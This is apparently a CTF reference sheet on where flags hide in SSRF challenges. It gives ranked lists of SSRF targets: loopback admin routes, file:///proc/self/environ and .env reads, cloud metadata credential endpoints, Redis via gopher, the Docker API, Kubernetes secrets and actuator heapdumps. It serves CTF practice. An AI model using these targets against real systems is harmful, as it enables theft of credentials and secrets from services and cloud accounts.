# Flag locations — where the flag actually lives

The consolidated map — the places CTF authors put the flag in an
SSRF challenge — ordered by frequency.

---

## 1. The internal-route — the classic home (~40%)

```text
the flag is a route on the app itself or a sibling — loopback-
only or internal-only:
  http://127.0.0.1:<port>/flag
  http://127.0.0.1:<port>/admin/flag
  http://127.0.0.1:<port>/internal/flag
  http://localhost:<port>/flag
  http://<sibling>:<port>/flag
  http://internal:<port>/flag
  http://admin.<internal-domain>/flag
  http://127.0.0.1:<port>/api/flag
the route is loopback-gated — the fetch's 127.0.0.1-source passes
  the check — the whole point of the challenge
```

## 2. The file — the read-path (~25%)

```text
file:///flag
file:///flag.txt
file:///app/flag
file:///proc/self/environ   — the flag-as-env-var — FLAG=x —
                              the env-file is the flag-home in
                              env-flag challenges — MOST common
                              file-target after /flag
file:///proc/1/environ       — the container-launch-env
file:///root/flag
file:///var/www/flag
file:///app/.env             — FLAG= in the dotenv
file:///proc/self/cwd/flag
the file-paths are the read-loop's wordlist — the path is the
  puzzle — /proc/self/maps + the conf-files reveal it
```

## 3. The metadata — the cloud-shape (~15%)

```text
aws user-data                — the bootstrap-script — flag inside
aws iam-creds                — the role-creds — the cloud-access
gcp startup-script / kube-env — the attr-paths
gcp service-account-token    — the gcp-creds
azure managed-identity-token — the azure-creds
do user-data
alibaba user-data / ram-creds
the metadata is the flag-home when the deploy is cloud — the
  user-data is the #1 spot — the bootstrap-script
```

## 4. The data-store — the flag-as-key (~10%)

```text
redis:    GET flag / KEYS * → the flag-key — gopher/dict
memcached: get flag / cachedump — the flag-key
elasticsearch: /_search?q=flag — the flag-document
consul:   /v1/kv/flag?raw — the kv-key
etcd:     /v2/keys/flag — the etcd-key
mongo:    the flag-document — the db-collection
mysql/pg: the flag-row — the db — but binary-protocol — usually
          unreachable via url-fetch — the http-admin variant
couchdb:  /db/_all_docs — the flag-doc
```

## 5. The env-var — the FLAG= pattern (~10%)

```text
file:///proc/self/environ    — the env — FLAG=flag{...}
http://127.0.0.1:<port>/actuator/env   — spring env-dump — the
                                          env-vars incl. FLAG
http://127.0.0.1:<port>/debug/vars     — go-expvar — the env
file:///proc/1/environ
http://<container-api>/containers/<id>/json → the container-env —
                                              docker-inspect — the
                                              flag in the launch-env
```

## 6. The internal-message — the communication (~5%)

```text
the flag sits in a message — a queue, an email, a log, a trace:
  rabbitmq-queue            — /api/queues — a message carries it —
                              guest:guest on loopback
  mailhog/inbox             — /api/v2/messages — the flag-mail —
                              the captured-mail — the flag was
                              "emailed" — a mail-trap-service
  smtp/imap                 — gopher→mail-protocol → read the
                              flag-mail
  zipkin/jaeger traces      — a request-trace contains it — the
                              trace-data — the flag was "requested"
  the app-logs              — file:///var/log/* — the flag in a
                              log-entry — the request-log
  supervisord/app-logs      — the stdout-capture
  the worker-queue          — a job's args
```

## 7. The sibling-service — the other-container

```text
the flag is a second app/service — not the web-app:
  - a "flag-service" on another port — the port-sweep finds it —
    a custom tcp-service — gopher its line-protocol
  - a sibling-compose-service — http://flag-service:8080/flag —
    the internal-name resolves it — the compose-network
  - a k8s-pod — the pod-ip — the /proc/net/arp neighbors
```

## 8. The control-plane — the infrastructure (~3%)

```text
docker-api containers/<id>/json — the env-field
k8s-secrets — /api/v1/secrets — the flag-secret — base64
consul-kv / etcd — the infra-config
jenkins-script-console — the env/plugin secrets — RCE→flag
the control-planes hold the flag as a secret — the infra-path
```

## 9. The "no-flag" — the flag is IMPACT not location (~2%)

```text
the flag isn't stored — the ssrf's IMPACT is the solve:
  - the desync-response — the injected-request's answer — the
    weather-app — the flag comes back in the desync'd-response
  - the container-spawn — the escape IS the flag — the "the flag
    is on the host" — the spawn mounts it
  - the rce — the exec-output IS the flag
```

## 10. The location-decision order

```text
the priority-order for where to look:
  1. file:///proc/self/environ   — the env — cheap, common —
                                   env-flag is the norm
  2. http://127.0.0.1:<port>/flag — the loopback-route — the
                                    classic
  3. file:///flag file:///app/flag — the file
  4. the metadata-IP             — if cloud
  5. the port-map                — the services — the flag-key
  6. the sibling                 — the other-container
  7. the message/log/trace       — the flag-in-transit
  8. the control-plane           — the infra-secrets
the order is "cheap + likely" — the env+route+file cover most
```

## 11. The "the flag is somewhere unusual" — the esoteric

```text
- a cookie-value — the app's session-cookie holds the flag —
  the fetch's response-headers — the Set-Cookie — the flag-as-
  cookie — the loopback-login returns it
- a header — X-Flag: — the response-headers — the custom-header
- a fragment — the url-fragment — but fragments don't reach the
  wire — the app's client-side flag — the page-source
- a dns-txt-record — the flag in DNS — the resolver-side — the
  internal-dns — dig-able — url-fetch can't dig — different-
  primitive
- an image — the flag rendered — the image-response — ocr/visual
- a pdf — the flag in a generated-pdf — pdf_text reads it
- the proc-fd — /proc/self/fd/N — an open-fd to the flag-file
- a swap/core — /proc/kcore / a coredump — the flag in memory —
  the heapdump-route — /actuator/heapdump → grep
```

## 12. The discovery — when the location isn't listed

```text
the flag-home is unlisted → the discovery-paths:
  - /proc/self/maps → the loaded-files → the app-paths → the
    flag-path in the route-handlers
  - the conf-files → nginx/apache → the route-declarations →
    the internal-routes → where /flag lives
  - the env-vars → the config-refs → "FLAG_FILE=/x" — the env
    names the path
  - the app-source → the route-defs → "app.get('/flag'..."
  - the sibling-inventory → the other-services → the flag-service
  - the mountinfo → the mounted-volumes → the flag-volume
```
